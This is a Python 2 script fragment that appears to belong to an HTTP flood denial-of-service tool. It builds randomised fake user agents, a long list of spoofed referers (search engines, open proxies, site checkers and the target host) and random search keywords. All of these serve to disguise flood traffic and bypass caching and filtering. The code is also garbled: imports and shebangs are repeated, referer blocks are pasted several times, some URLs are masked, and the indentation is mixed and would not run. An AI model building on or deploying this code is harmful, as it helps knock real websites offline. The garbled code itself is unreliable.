#!/usr/bin/env python
#!/usr/bin/env python2
#!/usr/bin/env python3
#!/usr/bin/python2
#!/usr/bin/python3
#coding: utf-8
import random
import socket
import threading
import time
import datetime
import urllib2
import urllib
import re
import sys
import optparse
import os
import urlparse		
import string
import random
import socket
import time
import random
import random
import socket
import threading
import datetime
import random, socket, threading, time, datetime, urllib2, urllib, re, sys, optparse, os, urlparse
global term
from threading import Thread	

from multiprocessing import Process, Manager
import urlparse, ssl
import sys, getopt, random, time

import atexit
from gzip import GzipFile
from threading import Lock
from logging import getLogger
from cStringIO import StringIO
from httplib import HTTPMessage
from urllib import urlencode, quote
 
import urllib2
import cookielib
cookielib.debug = lambda *a: None
from socket import setdefaulttimeout

def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
def referer_list():
        global headers_referers
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://coccoc.com/search#query=')
        headers_referers.append('http://www.search.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
        headers_referers.append('http://blekko.com/#ws/?q=')
        headers_referers.append('http://www.infomine.com/search/?q=')
        headers_referers.append('https://twitter.com/search?q=')
        headers_referers.append('http://www.wolframalpha.com/input/?i=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.onlinewebcheck.com/?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.pagescoring.com/website-speed-test/?url=')
        headers_referers.append('http://check-host.net/check-http?host=')
        headers_referers.append('http://checksite.us/?url=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://coccoc.com/search#query=')
        headers_referers.append('https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://content-available-to-author-only.com/profile.php?redirect=')
        headers_referers.append('http://w...content-available-to-author-only...y.com/search/results?q=')
        headers_referers.append('http://y...content-available-to-author-only...x.ru/yandsearch?text=')
        headers_referers.append('http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=')
        headers_referers.append('http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://h...content-available-to-author-only...u.com/searchResult?keywords=')
        headers_referers.append('http://w...content-available-to-author-only...g.com/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...x.com/yandsearch?text=')
        headers_referers.append('https://d...content-available-to-author-only...o.com/?q=')
        headers_referers.append('http://w...content-available-to-author-only...k.com/web?q=')
        headers_referers.append('http://s...content-available-to-author-only...l.com/aol/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('http://v...content-available-to-author-only...3.org/feed/check.cgi?url=')
        headers_referers.append('http://h...content-available-to-author-only...r.com/check_page/?furl=')
        headers_referers.append('http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://j...content-available-to-author-only...3.org/css-validator/validator?uri=')
        headers_referers.append('https://a...content-available-to-author-only...o.com/rss?url=')
        headers_referers.append('http://e...content-available-to-author-only...l.com/search?q=')
        headers_referers.append('https://s...content-available-to-author-only...y.com/market/search?q=')
        headers_referers.append('http://f...content-available-to-author-only...o.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=')
        headers_referers.append('http://e...content-available-to-author-only...e.net/wow/en/search?q=')
        headers_referers.append('http://e...content-available-to-author-only...l.com/search?q=')
        headers_referers.append('http://c...content-available-to-author-only...n.org/search?q=')
        headers_referers.append('http://t...content-available-to-author-only...t.edu/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...m.tv/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...d.com/search?q=')
        headers_referers.append('http://f...content-available-to-author-only...a.com/search?q=')
        headers_referers.append('http://i...content-available-to-author-only...h.io/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...s.com/jobs/search?q=')
        headers_referers.append('http://t...content-available-to-author-only...p.org/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...m.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...s.gov/@@tceq-search?q=')
        headers_referers.append('http://w...content-available-to-author-only...t.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...r.com/events/search?q=')
        headers_referers.append('https://c...content-available-to-author-only...e.org/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...s.com/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...g.com/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...t.com/search/?q=')
        headers_referers.append('http://m...content-available-to-author-only...r.org/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...s.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...s.uk/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...q.com/search?q=')
        headers_referers.append('http://www.search.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=')
        headers_referers.append('https://www.facebook.com/l.php?u=')
        headers_referers.append('https://www.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://downforeveryoneorjustme.com/')
        headers_referers.append('http://www.slickvpn.com/go-dark/browse.php?u=')
        headers_referers.append('https://www.megaproxy.com/go/_mp_framed?')
        headers_referers.append('http://scanurl.net/?u=')
        headers_referers.append('http://www.isup.me/')
        headers_referers.append('http://check-host.net/check-tcp?host=')
        headers_referers.append('http://check-host.net/check-dns?host=')
        headers_referers.append('http://check-host.net/check-ping?host=')
        headers_referers.append('http://www.currentlydown.com/')
        headers_referers.append('http://check-host.net/check-ping?host=')
        headers_referers.append('http://check-host.net/check-tcp?host=')
        headers_referers.append('http://check-host.net/check-dns?host=')
        headers_referers.append('http://check-host.net/ip-info?host=')
        headers_referers.append('https://safeweb.norton.com/report/show?url=')
        headers_referers.append('http://www.webproxy.net/view?q=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('https://anonysurfer.com/a2/index.php?q=')
        headers_referers.append('http://analiz.web.tr/en/www/')
        headers_referers.append('https://plus.google.com/share?url=')
        headers_referers.append('http://' + host + '/')
        return(headers_referers)	
def keyword_list():
	global keyword_top
	keyword_top.append('Sex')
	keyword_top.append('Robin Williams')
	keyword_top.append('World Cup')
	keyword_top.append('Ca Si Le Roi')
	keyword_top.append('Ebola')
	keyword_top.append('Malaysia Airlines Flight 370')
	keyword_top.append('ALS Ice Bucket Challenge')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
	keyword_top.append('ISIS')
	keyword_top.append('Frozen')
	keyword_top.append('014 Sochi Winter Olympics')
	keyword_top.append('IPhone')
	keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
	keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
	keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('Facebook')
	keyword_top.append('DVHT')
	keyword_top.append('VHS')
	keyword_top.append('THT')
	keyword_top.append('GLT')
	keyword_top.append('WT')
	keyword_top.append('LUX')
	keyword_top.append('Darius')
	keyword_top.append('Garen')
	keyword_top.append('Master Yi')
	keyword_top.append('Rengar')
	keyword_top.append('Katarina')
	keyword_top.append('Shen')
	keyword_top.append('Maphile')
	keyword_top.append('Support')
	keyword_top.append('Mid')
	keyword_top.append('Top')
	keyword_top.append('Bot')
	keyword_top.append('AD')
	keyword_top.append('Fucking')
	keyword_top.append('Diana')
	keyword_top.append('Kotex')
	keyword_top.append('BCS')
	keyword_top.append('ZingSpeed')
	keyword_top.append('Firerush')
	keyword_top.append('1Shot')
	keyword_top.append('TruyKich')
	keyword_top.append('IPhone')
	keyword_top.append('Star War')
	keyword_top.append('Windows 10')
	keyword_top.append('Zens Phone')
	keyword_top.append('Son Tung M-TP')
	keyword_top.append('Viurs')
	keyword_top.append('RIP Face')
	keyword_top.append('tao quan')
	keyword_top.append('gia xang')
	keyword_top.append('Roll Royce')
	keyword_top.append('Hai VL')
	keyword_top.append('Be Trang ss')
	keyword_top.append('FIFA')
	keyword_top.append('Bill Gate')
	keyword_top.append('UFO')
	keyword_top.append('Microsoft')
	keyword_top.append('Mark Zuckerberg')
        keyword_top.append('youtube')
        keyword_top.append('facebook')
        keyword_top.append('download')
        keyword_top.append('movies')
        keyword_top.append('google')
        keyword_top.append('streaming')
        keyword_top.append('hotmail')
        keyword_top.append('facebook login')
        keyword_top.append('internet')
        keyword_top.append('yahoo')
        keyword_top.append('madasfish')
        keyword_top.append('antivirus software')
        keyword_top.append('ebay')
        keyword_top.append('yahoo mail')
        keyword_top.append('craigslist')
        keyword_top.append('aot')
        keyword_top.append('paid to promote')
        keyword_top.append('dvd movies online')
        keyword_top.append('gmail')
        keyword_top.append('games')
        keyword_top.append('fb')
        keyword_top.append('internetreal')
        keyword_top.append('shopping')
        keyword_top.append('proxy dozer')
        keyword_top.append('amazon')
        keyword_top.append('jobs')
        keyword_top.append('video')
        keyword_top.append('promote')
        keyword_top.append('new')
        keyword_top.append('twitter')
        keyword_top.append('minecraft')
        keyword_top.append('paid to')
        keyword_top.append('free')
        keyword_top.append('earn cpcs')
        keyword_top.append('earn chi')
        keyword_top.append('netflix')
        keyword_top.append('videos')
        keyword_top.append('net')
        keyword_top.append('pulse')
        keyword_top.append('posted by')
        keyword_top.append('date you')
        keyword_top.append('news')
        keyword_top.append('this date')
        keyword_top.append('msn')
        keyword_top.append('facebook yahoo')
        keyword_top.append('dating')
        keyword_top.append('birthday gifts')
        keyword_top.append('cars')
        keyword_top.append('best100tattoos')
        keyword_top.append('walmart')
        keyword_top.append('lkckclckli1i')
        keyword_top.append('sports')
        keyword_top.append('software')
        keyword_top.append('music')
        keyword_top.append('the')
        keyword_top.append('email marketing')
        keyword_top.append('broadband')
        keyword_top.append('online')
        keyword_top.append('insurance')
        keyword_top.append('movie')
        keyword_top.append('tramadol')
        keyword_top.append('weight loss')
        keyword_top.append('chat')
        keyword_top.append('home')
        keyword_top.append('yahoo google')
        keyword_top.append('car insurance')
        keyword_top.append('face')
        keyword_top.append('spyware')
        keyword_top.append('you tube')
        keyword_top.append('free tv shows')
        keyword_top.append('downloads')
        keyword_top.append('google maps')
        keyword_top.append('websbiggest')
        keyword_top.append('macromedia flash player free download')
        keyword_top.append('m nova')
        keyword_top.append('facebook friends')
        keyword_top.append('phentermine')
        keyword_top.append('weather')
        keyword_top.append('watch online')
        keyword_top.append('medical insurance')
        keyword_top.append('dating websites')
        keyword_top.append('in')
        keyword_top.append('movies online')
        keyword_top.append('friv')
        keyword_top.append('search')
        keyword_top.append('alo')
        keyword_top.append('houses for rent by owner')
        keyword_top.append('of')
        keyword_top.append('internet marketing')
        keyword_top.append('blogging make money')
        keyword_top.append('make money blogging')
        keyword_top.append('game')
        keyword_top.append('movie2k')
        keyword_top.append('walmart stores')
        keyword_top.append('credit card')
        keyword_top.append('instagram')
        keyword_top.append('internet marketing advertising')
        keyword_top.append('biz')
        keyword_top.append('travel')
        keyword_top.append('to')
        keyword_top.append('dating website')
        keyword_top.append('windows')
        keyword_top.append('quick weight loss diet')
